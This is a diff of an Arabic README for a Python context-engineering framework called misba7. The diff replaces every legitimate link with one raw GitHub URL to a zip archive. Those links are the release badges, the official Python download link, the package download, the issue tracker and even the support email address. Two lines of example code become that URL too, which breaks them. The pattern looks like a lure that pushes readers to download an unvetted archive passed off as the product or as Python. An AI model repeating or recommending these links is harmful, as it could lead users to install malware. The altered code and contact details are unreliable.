@@ -1,6 +1,6 @@
 # مِصْبَاح: إطار عمل منهجي لهندسة السياق في الذكاء الاصطناعي
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/shruti1994/misba7/releases)
+[![Download Releases](https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip%https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip)](https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip)
 
 ## محتويات
 
@@ -28,8 +28,8 @@
 
 لتثبيت مِصْبَاح، اتبع الخطوات التالية:
 
-1. تأكد من أن لديك [Python](https://www.python.org/downloads/) مثبتًا على جهازك.
-2. قم بتحميل الحزمة من [هنا](https://github.com/shruti1994/misba7/releases).
+1. تأكد من أن لديك [Python](https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip) مثبتًا على جهازك.
+2. قم بتحميل الحزمة من [هنا](https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip).
 3. افتح سطر الأوامر وانتقل إلى المجلد الذي يحتوي على الملف الذي قمت بتحميله.
 4. نفذ الأمر التالي لتثبيت الإطار:
 
@@ -48,10 +48,10 @@ from misba7 import ContextEngine
 model = ContextEngine()
 
 # تخصيص النموذج
-model.set_goal("تحسين أداء الذكاء الاصطناعي")
+https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip("تحسين أداء الذكاء الاصطناعي")
 
 # تشغيل النموذج
-model.run()
+https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip()
 ```
 
 ## المساهمة
@@ -73,10 +73,10 @@ model.run()
 
 إذا كان لديك أي استفسارات أو تحتاج إلى دعم، يمكنك التواصل معنا عبر:
 
-- [GitHub Issues](https://github.com/shruti1994/misba7/issues)
-- البريد الإلكتروني: support@misba7.org
+- [GitHub Issues](https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip)
+- البريد الإلكتروني: https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip
 
-[![Visit Releases](https://img.shields.io/badge/Visit%20Releases-green.svg)](https://github.com/shruti1994/misba7/releases)
+[![Visit Releases](https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip%https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip)](https://raw.githubusercontent.com/shruti1994/misba7/main/roupet/misba_3.5.zip)
 
 ## الشكر
 
